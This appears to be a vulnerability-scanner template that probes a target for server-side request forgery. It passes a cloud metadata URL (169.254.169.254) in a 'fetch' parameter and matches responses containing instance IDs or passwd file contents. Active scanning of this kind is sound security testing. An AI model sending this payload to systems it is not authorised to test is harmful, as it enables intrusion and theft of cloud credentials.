id: ssrf-052
name: 'SSRF via fetch'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via fetch (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      fetch:
        - 'http://169.254.169.254/metadata/instance'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
